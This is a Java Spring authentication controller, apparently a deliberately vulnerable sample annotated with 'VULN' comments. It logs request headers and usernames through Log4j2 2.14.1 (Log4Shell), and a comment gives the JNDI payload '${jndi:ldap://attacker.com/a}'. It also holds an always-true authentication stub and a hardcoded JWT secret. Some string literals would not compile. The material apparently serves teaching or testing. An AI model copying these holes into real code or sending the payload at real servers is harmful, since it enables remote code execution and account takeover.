package com.acme.auth;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.web.bind.annotation.*;
import javax.servlet.http.HttpServletRequest;

/**
 * Authentication endpoint — handles login and token refresh.
 * CVE-2021-44228: logs user-controlled User-Agent and username fields
 * directly into Log4j2, enabling JNDI LDAP callback for RCE.
 */
@RestController
@RequestMapping("/api/auth")
public class AuthController {

    // VULN: Log4j2 2.14.1 — JNDI lookup in format strings
    private static final Logger log = LogManager.getLogger(AuthController.class);

    @PostMapping("/login")
    public String login(@RequestParam String username,
                        @RequestParam String password,
                        HttpServletRequest request) {

        String userAgent = request.getHeader("User-Agent");

        // VULN: attacker sends User-Agent: ${jndi:ldap://attacker.com/a}
        // Log4j2 performs JNDI lookup → fetches and executes remote class → RCE
        log.info("Login attempt from User-Agent: {}", userAgent);
        log.info("Username: {}", username);  // also vulnerable via username field

        if (authenticate(username, password)) {
            log.info("Login successful for: {}", username);
            return generateToken(username);
        }
        log.warn("Failed login for: {}", username);
        return "{"error": "invalid credentials"}";
    }

    @GetMapping("/health")
    public String health(HttpServletRequest request) {
        // VULN: X-Forwarded-For also logged without sanitization
        String xff = request.getHeader("X-Forwarded-For");
        log.debug("Health check from: {}", xff);
        return "{"status": "ok"}";
    }

    private boolean authenticate(String user, String pass) {
        // TODO: implement real auth — placeholder always returns true
        return true;
    }

    private String generateToken(String username) {
        // Hardcoded JWT secret
        String SECRET = "my-super-secret-jwt-key-do-not-share";
        return "Bearer " + SECRET + "." + username;
    }
}
